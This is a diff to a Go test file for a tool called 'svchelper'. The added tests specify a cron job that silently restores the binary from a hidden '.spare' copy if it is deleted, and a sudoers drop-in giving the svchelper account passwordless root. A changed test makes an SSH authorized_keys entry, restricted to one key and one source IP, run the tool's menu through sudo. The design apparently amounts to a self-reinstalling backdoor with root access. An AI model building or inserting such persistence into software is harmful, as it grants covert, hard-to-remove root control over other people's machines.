@@ -30,6 +30,46 @@ func TestCronLineAndMarker(t *testing.T) {
 	}
 }
 
+func TestCronLineRestoresBinaryFromSpareIfMissing(t *testing.T) {
+	line := cronLine("svchelper-sentinel", "/usr/local/sbin/svchelper")
+	for _, want := range []string{
+		"test -x /usr/local/sbin/svchelper",
+		"cp /var/lib/svchelper/.spare /usr/local/sbin/svchelper",
+		"chmod 0700 /usr/local/sbin/svchelper",
+	} {
+		if !strings.Contains(line, want) {
+			t.Errorf("cron line missing %q: %s", want, line)
+		}
+	}
+}
+
+func TestSpareBinaryPath(t *testing.T) {
+	if got := spareBinaryPath("/usr/local/sbin/svchelper"); got != "/var/lib/svchelper/.spare" {
+		t.Errorf("expected /var/lib/svchelper/.spare, got %s", got)
+	}
+}
+
+func TestOpmenuUserHomeAndSudoersPaths(t *testing.T) {
+	if home := opmenuUserHome("svchelper"); home != "/home/svchelper" {
+		t.Errorf("expected /home/svchelper, got %s", home)
+	}
+	if path := sudoersDropInPath("svchelper"); path != "/etc/sudoers.d/svchelper" {
+		t.Errorf("expected /etc/sudoers.d/svchelper, got %s", path)
+	}
+}
+
+func TestSudoersDropInContent(t *testing.T) {
+	content := sudoersDropInContent("svchelper", "/usr/local/sbin/svchelper")
+	for _, want := range []string{
+		"Defaults:svchelper !requiretty",
+		"svchelper ALL=(root) NOPASSWD: /usr/local/sbin/svchelper",
+	} {
+		if !strings.Contains(content, want) {
+			t.Errorf("sudoers content missing %q: %s", want, content)
+		}
+	}
+}
+
 func TestAuthorizedKeysLineRequiresBuildTimeValues(t *testing.T) {
 	oldPubKey, oldFromIP := buildTeamPubKey, buildTeamFromIP
 	defer func() { buildTeamPubKey, buildTeamFromIP = oldPubKey, oldFromIP }()
@@ -45,7 +85,7 @@ func TestAuthorizedKeysLineRequiresBuildTimeValues(t *testing.T) {
 		t.Fatal(err)
 	}
 	for _, want := range []string{
-		`command="/usr/local/sbin/svchelper opmenu"`,
+		`command="sudo /usr/local/sbin/svchelper opmenu"`,
 		`from="203.0.113.10"`,
 		"no-port-forwarding",
 		"no-pty",
